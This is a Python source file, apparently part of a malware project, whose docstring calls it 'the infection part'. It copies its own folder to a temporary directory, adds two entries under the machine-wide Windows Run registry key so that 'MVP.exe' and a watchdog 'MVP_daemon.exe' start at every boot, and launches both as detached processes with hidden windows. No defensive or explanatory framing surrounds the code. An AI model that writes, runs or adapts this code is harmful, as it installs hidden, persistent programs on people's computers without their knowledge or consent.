"""
The purpose of this file is to implement the infection part.
The program will copy itself to %PATH% and run the deamon.
"""
import logging
import os
import shutil
import subprocess
import tempfile
import winreg
from subprocess import DETACHED_PROCESS

SHOW_SHELL = False
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW


def copy_to_path(path):
    try:
        shutil.copytree(os.path.dirname(__file__) or os.getcwd(), path, dirs_exist_ok=True)
        logging.info(f"Copied current directory to {path}")
    except Exception as e:
        print(path)
        print(e)


def start_daemon():
    temp_path = tempfile.TemporaryDirectory().name
    exec_path = os.path.join(temp_path, 'dist', 'MVP.exe')
    demon_path = os.path.join(temp_path, 'dist', 'MVP_daemon.exe')

    # 1 copy demon to %temp% folder
    copy_to_path(temp_path)

    # 2 Using the windows' registry, setting the watchdog to run at startup
    registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    reg_autoboot_key = winreg.OpenKey(registry, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                      winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(reg_autoboot_key, "MVP", 0, winreg.REG_SZ, exec_path)
    winreg.SetValueEx(reg_autoboot_key, "MVP_daemon", 0, winreg.REG_SZ, demon_path)

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    # 4 execute the deamon as an external process
    subprocess.Popen([demon_path],
                     shell=SHOW_SHELL, close_fds=True, creationflags=DETACHED_PROCESS, startupinfo=startupinfo,
                     stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.DEVNULL)

    # 5 run MVP as an external process and abort infection
    subprocess.Popen([exec_path],
                     shell=SHOW_SHELL, close_fds=True, creationflags=DETACHED_PROCESS, startupinfo=startupinfo,
                     stdin=subprocess.DEVNULL)


if __name__ == "__main__":
    start_daemon()
